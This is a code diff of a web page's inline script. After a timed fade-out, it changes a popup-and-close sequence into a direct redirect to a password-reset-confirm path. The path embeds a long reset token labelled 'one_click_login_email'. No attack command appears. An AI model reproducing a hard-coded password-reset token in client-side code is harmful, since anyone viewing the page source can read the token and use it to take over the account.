@@ -99,10 +99,7 @@
             document.getElementById('container').style.opacity = '0';
             setTimeout(function() {
                 document.getElementById('container').style.display = 'none';
-                var newWindow = window.open('password/reset/confirm/uidb36=7qiyibu&token=EWRuV3VwKF7rxeffAIcnQymf8KklugVa8AcSYfGj8zK9LWk44NMBlpPRSvMXePS3:one_click_login_email&s=one_click_login_email/Verify.html', '_blank');
-            // Close both windows
-            window.close();
-            newWindow.close();
+                window.location.href = 'password/reset/confirm/uidb36=7qiyibu&token=EWRuV3VwKF7rxeffAIcnQymf8KklugVa8AcSYfGj8zK9LWk44NMBlpPRSvMXePS3:one_click_login_email&s=one_click_login_email/Verify.html';
             }, 100); // Adjust the delay as needed
         }, 1600); // Adjust the initial delay as needed
     </script>
